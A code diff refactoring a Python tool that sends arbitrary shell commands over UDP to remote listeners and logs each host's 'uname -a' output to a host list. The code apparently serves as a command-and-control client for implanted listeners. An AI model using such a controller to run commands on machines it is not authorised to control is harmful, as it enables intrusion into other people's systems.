@@ -19,9 +19,9 @@ def execute(command):
 		try:
 			response = respSock.recvfrom(4096)
 			output = response[0]
-			print(output.decode('utf-8'))
+			return(output.decode('utf-8'))
 		except socket.timeout:
-			print("UwU, looks like there's no listener")
+			return("UwU, looks like there's no listener")
 	
 	except socket.gaierror:
 		print("OWO (notices lack of internet connection)")
@@ -32,7 +32,8 @@ try:
 			shellCom = sys.argv[3]
 			for x in range(4, len(sys.argv)):
 				shellCom = shellCom + " " + sys.argv[x]
-			execute(shellCom)
+			output = execute(shellCom)
+			print(output)
 		elif instruction == 'list':
 			filename = "hosts.txt"
 			file = open(filename,'r')
@@ -40,24 +41,14 @@ try:
 				print(line)
 			file.close
 		elif instruction == 'listadd':
-			ip = sys.argv[1]
-			filename = 'hosts.txt'
 			ip = sys.argv[2]
-			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			sock.sendto(bytes('uname -a', 'utf-8'), (ip, 5151))
-			respSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			respSock.bind(('0.0.0.0', 6060))
-			respSock.settimeout(15)
-			try:
-				data = respSock.recvfrom(4096)
-				file = open(filename, 'a')
-				osInfo = data[0].decode('utf-8')
-				if osInfo != 'oWo naughty, you can\'t do that':
-					file.write(ip+"|"+osInfo+"\n")
-				else:
-					file.write(ip + "|" + 'Windows')
-			except socket.timeout:
-				print('UWU No listener available')
+			filename = 'hosts.txt'
+			file = open(filename, 'a')
+			data = execute('uname -a')
+			if data != 'oWo naughty, you can\'t do that':
+				file.write(ip + '|' + data + '\n')
+			else:
+				file.write(ip + '|' + 'Windows' + '\n')
 
 	else:
 		print(usageString)
